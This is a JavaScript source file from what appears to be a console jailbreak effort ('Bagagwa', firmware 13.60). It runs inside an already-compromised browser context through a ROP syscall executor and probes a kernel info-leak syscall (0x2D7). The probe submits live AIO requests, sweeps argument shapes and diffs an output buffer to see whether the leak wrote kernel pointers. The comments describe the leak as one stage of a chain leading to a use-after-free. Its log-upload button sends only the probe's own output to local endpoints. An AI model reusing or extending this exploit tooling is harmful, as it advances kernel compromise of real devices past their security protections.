/*
 * bagagwa_727probe.js -- read-only reachability probe for syscall 0x2D7
 * (get_aio_debug_request_info), the leak stage named in the Bagagwa writeup.
 *
 * Loaded INSTEAD OF bagagwa_probe.js when the URL carries &probe727=1.
 *
 * WHY THIS EXISTS
 * ---------------
 * The writeup names 0x2D7 as the leak: a bounds bypass in get_aio_debug_request_info
 * that uses a slot index as a bias into a different array, and copies a dword at +0x20
 * plus two 8-byte pointers per element out to a caller buffer. Bounds are
 * [1, table->0x228] with req_id>>16 < 0x80. No public chain has made it work:
 * Wigglez-sudo's 12.40 notebook records "every 727 call returned EFAULT or ESRCH and
 * never wrote a byte", and PSAITO cannot call 727 at all in stub mode because 727 has
 * no libkernel wrapper.
 *
 * THIS EXECUTOR CAN CALL 727. rop-worker dispatches by raw rax, not through the
 * 331-entry stub table (syscalls.js), so an un-stubbed syscall number is callable here
 * and is not callable from PSAITO's engine. That is the whole reason this probe exists.
 *
 * WHAT IT DOES
 * ------------
 *   1. Creates two LIVE pending MULTI_READ requests (aio_submit_cmd, proven working on
 *      13.60 by the 11:21 hardware run).
 *   2. Reads their raw ids -- the ids the kernel actually hands out, which is what 727
 *      expects (they carry the req_id>>16 / low-16 split the writeup describes).
 *   3. For each id, sweeps a small matrix of argument shapes and count values against
 *      0x2D7, pre-filling the output buffer with 0xEE and diffing after each call.
 *   4. After EVERY call, runs a getpid canary. If the canary stops answering, the
 *      kernel wedged and the probe aborts -- the verdict says so instead of guessing.
 *   5. Cleans up: aio_multi_cancel + aio_multi_delete + closes.
 *
 * READ-ONLY. No num>=2 anywhere. No kernel writes. No tile can arm the UAF from here.
 * A crash costs a reload; a wedge from a badly-chosen syscall costs a power cycle, so
 * the canary discipline is the safety wall.
 */
(function (root) {
    "use strict";
    if (root.__B727_LOADED) return;
    root.__B727_LOADED = true;

    var FW = root.fw_str || "?";

    /* ---- syscall numbers, all proven on 13.60 ---- */
    var SYS_GETPID          = 0x014;
    var SYS_CLOSE           = 0x006;
    var SYS_SOCKETPAIR      = 0x035;
    var SYS_PIPE2           = 0x2AF;
    var SYS_AIO_SUBMIT_CMD  = 0x29D;
    var SYS_AIO_MULTI_CANCEL= 0x29A;
    var SYS_AIO_MULTI_DELETE= 0x296;
    var SYS_AIO_DEBUG_INFO  = 0x2D7;

    var AIO_CMD_MULTI_READ  = 0x1001;
    var PRIO                = 3;
    var NREQ                = 2;

    function B(x) { return (typeof x === "bigint") ? x : BigInt(x); }
    function hex(v) {
        try {
            var b = BigInt(v);
            if (b < 0n) b = BigInt.asUintN(64, b);
            return "0x" + b.toString(16);
        } catch (e) { return String(v); }
    }
    function malloc(sz) { return B(root.malloc(sz)); }
    function zeros(ptr, n) {
        var z = new Uint8Array(n);
        if (root.write_buffer) root.write_buffer(B(ptr), z);
        return ptr;
    }
    function fill(ptr, n, byte) {
        var z = new Uint8Array(n);
        for (var i = 0; i < n; i++) z[i] = byte;
        if (root.write_buffer) root.write_buffer(B(ptr), z);
        return ptr;
    }
    function readBytes(ptr, n) {
        if (!root.read_buffer) return new Uint8Array(n);
        return new Uint8Array(root.read_buffer(B(ptr), n));
    }
    function bytesEqual(a, b) {
        if (a.length !== b.length) return false;
        for (var i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
        return true;
    }
    function hexBytes(u8) {
        var s = "";
        for (var i = 0; i < u8.length; i++) s += u8[i].toString(16).padStart(2, "0");
        return s;
    }
    function canary() {
        try {
            var r = B(root.syscall(SYS_GETPID));
            return r > 0n && r < 0x100000n;
        } catch (e) { return false; }
    }
    function S(nr, a, b, c, d, e, f) {
        var args = [a, b, c, d, e, f].map(function (x) {
            return x === undefined ? 0n : B(x);
        });
        return B(root.syscall(nr, args[0], args[1], args[2], args[3], args[4], args[5]));
    }

    var CSS = [
        ".b727-root{position:fixed;inset:0;z-index:2147483647;background:#0c0c0f;",
        "color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;",
        "padding:16px 18px 14px;box-sizing:border-box;user-select:none;-webkit-user-select:none;}",
        ".b727-root *{box-sizing:border-box;}",
        ".b727-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}",
        ".b727-logo{font-size:1.35rem;font-weight:800;letter-spacing:.22em;color:#fff;margin-right:2px;}",
        ".b727-chip{font-size:.78rem;font-weight:700;letter-spacing:.1em;padding:5px 11px;",
        "border-radius:999px;background:#202125;color:#a2a2a6;}",
        ".b727-chip.ok{background:#14361f;color:#5fdc90;}",
        ".b727-chip.bad{background:#3a1717;color:#ff8080;}",
        ".b727-chip.run{background:#33290d;color:#ffce5c;}",
        ".b727-spacer{flex:1;}",
        ".b727-sub{color:#6f7076;font-size:.82rem;line-height:1.5;margin:9px 0 13px;max-width:76rem;}",
        ".b727-outhd{display:flex;align-items:center;gap:9px;color:#6f7076;",
        "font-size:.74rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;",
        "margin-bottom:7px;}",
        ".b727-out{flex:1;min-height:8rem;overflow:auto;background:#16161a;",
        "border:1px solid #26262b;border-radius:.7rem;margin:0;padding:11px 13px;",
        "font:12.5px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
        "white-space:pre-wrap;word-break:break-word;-webkit-user-select:text;user-select:text;}",
        ".b727-sec{color:#fff;font-weight:800;}",
        ".b727-ok{color:#5fdc90;}",
        ".b727-err{color:#ff8080;}",
        ".b727-warn{color:#ffce5c;}",
        ".b727-dim{color:#6f7076;}",
        ".b727-foot{display:flex;gap:11px;flex-wrap:wrap;margin-top:13px;}",
        ".b727-btn{padding:.68rem 1.3rem;border-radius:1.05rem;border:none;cursor:pointer;",
        "background:#202125;color:#fff;font:800 .92rem Arial;}",
        ".b727-btn:hover{background:#a2a2a6;color:#202020;}",
    ].join("");

    var styleEl = document.createElement("style");
    styleEl.textContent = CSS;
    document.head.appendChild(styleEl);

    var panel = document.createElement("div");
    panel.className = "b727-root";
    panel.innerHTML = [
        '<div class="b727-head">',
        '  <span class="b727-logo">727</span>',
        '  <span class="b727-chip" id="b727-fw"></span>',
        '  <span class="b727-chip run" id="b727-state">idle</span>',
        '  <span class="b727-chip" id="b727-verdict"></span>',
        '  <span class="b727-spacer"></span>',
        '  <button class="b727-btn" id="b727-run">run probe</button>',
        '</div>',
        '<div class="b727-sub">Read-only reachability probe for syscall 0x2D7 '
            + '(get_aio_debug_request_info), the leak stage named in the Bagagwa '
            + 'writeup. Creates two live pending MULTI_READ requests, then sweeps '
            + 'argument shapes and count values against 0x2D7. No num&gt;=2. No kernel '
            + 'writes. A getpid canary runs after every call.</div>',
        '<div class="b727-outhd"><span>output</span><span id="b727-count"></span></div>',
        '<pre class="b727-out" id="b727-out"></pre>',
        '<div class="b727-foot">',
        '  <button class="b727-btn" id="b727-clear">clear output</button>',
        '  <button class="b727-btn" id="b727-dl">download log</button>',
        '  <button class="b727-btn" id="b727-sendlogs">send logs</button>',
        '</div>',
    ].join("");
    document.body.appendChild(panel);

    var elOut = document.getElementById("b727-out");
    var elCount = document.getElementById("b727-count");
    var elState = document.getElementById("b727-state");
    var elVerdict = document.getElementById("b727-verdict");
    var elFw = document.getElementById("b727-fw");
    elFw.textContent = "fw " + FW;

    var LOG = [];
    var LOGKEY = "b727_sc_log";
    var DISCORD_WEBHOOK = "/api/discord";
    try { var persisted = localStorage.getItem(LOGKEY); } catch (e) { }
    if (persisted) {
        var tail = persisted.slice(-4000).split("\n").filter(function (l) { return l.length; });
        for (var pi = 0; pi < tail.length; pi++) {
            var sp0 = document.createElement("span");
            sp0.className = "b727-dim";
            sp0.textContent = "    " + tail[pi] + "\n";
            elOut.appendChild(sp0);
        }
    }

    function stamp() {
        var d = new Date();
        var p = function (n) { return String(n).padStart(2, "0"); };
        return p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
    }
    function paint(text, cls) {
        var line = "[" + stamp() + "] " + text;
        LOG.push(line);
        try {
            var cur = localStorage.getItem(LOGKEY) || "";
            cur += line + "\n";
            if (cur.length > 16000) cur = cur.slice(-8000);
            localStorage.setItem(LOGKEY, cur);
        } catch (e) { }
        var span = document.createElement("span");
        if (cls) span.className = "b727-" + cls;
        span.textContent = line + "\n";
        elOut.appendChild(span);
        elOut.scrollTop = elOut.scrollHeight;
        elCount.textContent = LOG.length + " lines";
    }
    async function sendLogs() {
        var contents = "";
        try { contents = localStorage.getItem(LOGKEY) || LOG.join("\n"); } catch (e) { contents = LOG.join("\n"); }
        if (!contents || !contents.trim()) {
            notify("send logs: no log yet");
            out("SENDLOGS", "empty log", "warn");
            return;
        }
        try {
            var r = await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "text/plain; charset=utf-8" },
                body: String(contents)
            });
            if (!r.ok) throw new Error("discord " + r.status);
            notify("send logs: posted logs.txt to Discord webhook");
            out("SENDLOGS", "posted logs.txt to Discord webhook", "ok");
            return;
        } catch (e) {
            try {
                var fallback = await fetch("/api/logs", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ source: "bagagwa_727probe", log: contents })
                });
                var data = {};
                try { data = await fallback.json(); } catch (err) { }
                if (!fallback.ok) throw new Error((data && data.error) || "send failed");
                notify("send logs: local fallback saved to logs.txt");
                out("SENDLOGS", "local fallback saved", "warn");
                return;
            } catch (fallbackErr) {
                notify("send logs failed: " + (e && e.message ? e.message : String(e)) + " | fallback: " + (fallbackErr && fallbackErr.message ? fallbackErr.message : String(fallbackErr)));
                out("SENDLOGS", String(e && e.message ? e.message : e), "err");
            }
        }
    }
    function out(tag, detail, cls) {
        paint("727 " + tag + (detail ? "  " + detail : ""), cls);
        try { if (root.flushMark) root.flushMark("727-" + tag, String(detail || "")); } catch (e) { }
        try { if (root.syncMark) root.syncMark("727-" + tag, String(detail || "")); } catch (e) { }
    }
    function notify(msg) {
        try { if (root.send_notification) root.send_notification(msg); } catch (e) { }
    }
    function chip(el, cls, text) {
        el.className = "b727-chip" + (cls ? " " + cls : "");
        el.textContent = text;
    }

    function runProbe() {
        chip(elState, "run", "running");
        out("BEGIN", "fw=" + FW + " syscall=0x2D7 read-only", "sec");

        if (!canary()) {
            out("VERDICT", "no executor -- getpid did not answer", "err");
            chip(elState, "bad", "no executor");
            notify("727: no executor");
            return;
        }
        out("CANARY", "getpid ok", "ok");

        var rfd = -1, wfd = -1;
        var sfds = zeros(malloc(0x10), 0x10);
        var sp = S(SYS_SOCKETPAIR, 1n, 1n, 0n, sfds);
        if ((sp & 0xFFFFFFFFn) === 0n) {
            var sv = readBytes(sfds, 8);
            rfd = new Int32Array(sv.buffer, 0, 2)[0];
            wfd = new Int32Array(sv.buffer, 0, 2)[1];
            out("SRC", "socketpair rfd=" + rfd + " wfd=" + wfd, "ok");
        } else {
            var pfds = zeros(malloc(8), 8);
            var pp = S(SYS_PIPE2, pfds, 0n);
            if ((pp & 0xFFFFFFFFn) === 0n) {
                var pv = readBytes(pfds, 8);
                rfd = new Int32Array(pv.buffer, 0, 2)[0];
                wfd = new Int32Array(pv.buffer, 0, 2)[1];
                out("SRC", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
            } else {
                out("VERDICT", "no live-request source: socketpair=" + hex(sp)
                    + " pipe2=" + hex(pp), "err");
                chip(elState, "bad", "no source");
                notify("727: no source");
                return;
            }
        }

        var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
        var fdb = new Uint8Array(8);
        fdb[0] = rfd & 0xff; fdb[1] = (rfd >> 8) & 0xff;
        fdb[2] = (rfd >> 16) & 0xff; fdb[3] = (rfd >> 24) & 0xff;
        for (var ri = 0; ri < NREQ; ri++)
            root.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), fdb);
        var ids = zeros(malloc(0x10), 0x10);
        var sub = S(SYS_AIO_SUBMIT_CMD, BigInt(AIO_CMD_MULTI_READ), reqs,
            BigInt(NREQ), BigInt(PRIO), ids);
        if ((sub & 0xFFFFFFFFn) !== 0n) {
            out("VERDICT", "submit refused " + hex(sub) + " -- cannot reach 727 without live ids", "err");
            chip(elState, "bad", "submit refused");
            notify("727: submit refused");
            S(SYS_CLOSE, BigInt(rfd)); S(SYS_CLOSE, BigInt(wfd));
            return;
        }
        var id0 = B(root.read64(ids));
        var id1 = B(root.read64(ids + 8n));
        out("SUBMIT", "ids=[" + hex(id0) + ", " + hex(id1) + "]", "ok");

        var OUTLEN = 0x40;
        var outBuf = malloc(OUTLEN);
        var sentinel = new Uint8Array(OUTLEN);
        for (var si = 0; si < OUTLEN; si++) sentinel[si] = 0xEE;

        var shapes = [
            { name: "id,1,out",        args: function (id) { return [id, 1n, outBuf, 0n, 0n, 0n]; } },
            { name: "id,out,1",        args: function (id) { return [id, outBuf, 1n, 0n, 0n, 0n]; } },
            { name: "out,id,1",        args: function (id) { return [outBuf, id, 1n, 0n, 0n, 0n]; } },
            { name: "0,id,1,out",      args: function (id) { return [0n, id, 1n, outBuf, 0n, 0n]; } },
            { name: "0,0,id,1,out",    args: function (id) { return [0n, 0n, id, 1n, outBuf, 0n]; } },
            { name: "id,1,0,out",      args: function (id) { return [id, 1n, 0n, outBuf, 0n, 0n]; } },
        ];
        var counts = [1n, 2n, 4n, 8n, 16n, 0x228n];

        var liveIds = [id0];
        if (id1 !== 0n && id1 !== id0) liveIds.push(id1);
        out("SWEEP", liveIds.length + " live id(s) x " + shapes.length
            + " shape(s) x " + counts.length + " count(s)", "dim");

        var hits = 0;
        var wedged = false;

        for (var li = 0; li < liveIds.length && !wedged; li++) {
            var id = liveIds[li];
            for (var ci = 0; ci < counts.length && !wedged; ci++) {
                var n = counts[ci];
                fill(outBuf, OUTLEN, 0xEE);
                var ret = S(SYS_AIO_DEBUG_INFO, id, n, outBuf, 0n, 0n, 0n);
                if (!canary()) {
                    out("WEDGE", "shape=canon id=" + hex(id) + " count=" + n
                        + " ret=" + hex(ret), "err");
                    wedged = true; break;
                }
                var got = readBytes(outBuf, OUTLEN);
                var changed = !bytesEqual(got, sentinel);
                if (changed) hits++;
                out("CALL", "id=" + hex(id) + " count=" + n
                    + " -> " + hex(ret)
                    + (changed ? "  BUFFER-CHANGED: " + hexBytes(got).slice(0, 64) : ""),
                    changed ? "ok" : "dim");
            }
        }

        for (var si2 = 1; si2 < shapes.length && !wedged; si2++) {
            var sh = shapes[si2];
            for (var lj = 0; lj < liveIds.length && !wedged; lj++) {
                fill(outBuf, OUTLEN, 0xEE);
                var a2 = sh.args(liveIds[lj]);
                var ret2 = S(SYS_AIO_DEBUG_INFO, a2[0], a2[1], a2[2], a2[3], a2[4], a2[5]);
                if (!canary()) {
                    out("WEDGE", "shape=" + sh.name + " -> " + hex(ret2), "err");
                    wedged = true; break;
                }
                var got2 = readBytes(outBuf, OUTLEN);
                var changed2 = !bytesEqual(got2, sentinel);
                if (changed2) hits++;
                out("CALL", sh.name + " id=" + hex(liveIds[lj])
                    + " -> " + hex(ret2)
                    + (changed2 ? "  BUFFER-CHANGED: " + hexBytes(got2).slice(0, 64) : ""),
                    changed2 ? "ok" : "dim");
            }
        }

        try {
            var stClean = zeros(malloc(0x20), 0x20);
            S(SYS_AIO_MULTI_CANCEL, ids, BigInt(NREQ), stClean, 0n, 0n, 0n);
            S(SYS_AIO_MULTI_DELETE, ids, BigInt(NREQ), stClean, 0n, 0n, 0n);
        } catch (e) { }
        try { S(SYS_CLOSE, BigInt(rfd)); } catch (e) { }
        try { S(SYS_CLOSE, BigInt(wfd)); } catch (e) { }

        if (wedged) {
            out("VERDICT", "WEDGE -- the kernel stopped answering after 0x2D7. "
                + "Power-cycle. Same failure mode an unproven syscall number produced.",
                "err");
            chip(elState, "bad", "wedge");
            notify("727: WEDGE -- power cycle");
            return;
        }
        if (hits > 0) {
            out("VERDICT", hits + " buffer change(s) -- the 727 leak WROTE to our buffer on 13.60. "
                + "First positive result; entry point for the leak stage.",
                "ok");
            chip(elState, "ok", "leak wrote");
            chip(elVerdict, "ok", hits + " hit(s)");
            notify("727: LEAK WROTE -- " + hits + " hit(s)");
            try { sendLogs(); } catch (e) { }
            return;
        }
        out("VERDICT", "no shape wrote to the buffer. Every call returned a small positive "
            + "value (EFAULT/ESRCH-shaped). Matches Wigglez-sudo's 12.40 result: the call "
            + "exists, the id encoding or argument contract is wrong. The matrix above is "
            + "the raw evidence -- the next step is a shape the sweep did not try.",
            "warn");
        chip(elState, "bad", "no leak");
        notify("727: no leak on 13.60");
        try { sendLogs(); } catch (e) { }
    }

    document.getElementById("b727-run").onclick = function () {
        try { runProbe(); } catch (e) {
            out("THREW", String((e && e.message) || e).slice(0, 140), "err");
            chip(elState, "bad", "threw");
        }
    };
    document.getElementById("b727-clear").onclick = function () {
        elOut.innerHTML = ""; LOG.length = 0; elCount.textContent = "0 lines";
    };
    document.getElementById("b727-dl").onclick = function () {
        try {
            var blob = new Blob([LOG.join("\n") + "\n"], { type: "text/plain" });
            var a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "bagagwa_727_" + FW + "_" + Date.now() + ".txt";
            document.body.appendChild(a); a.click();
            setTimeout(function () { try { a.remove(); } catch (e) { } }, 0);
        } catch (e) { }
    };
    document.getElementById("b727-sendlogs").onclick = sendLogs;

    var AUTORUN = false;
    try { AUTORUN = /(^|[?&])scauto=1(&|$)/.test(root.location.search || ""); } catch (e) { }
    if (AUTORUN) {
        setTimeout(function () {
            try { runProbe(); } catch (e) {
                out("THREW", String((e && e.message) || e).slice(0, 140), "err");
                chip(elState, "bad", "threw");
            }
        }, 200);
    } else {
        out("IDLE", "auto-run is off -- tap RUN PROBE", "dim");
    }

    out("READY", "panel up on " + FW, "sec");
    notify("727 probe up on " + FW);
})(typeof window !== "undefined" ? window : globalThis);
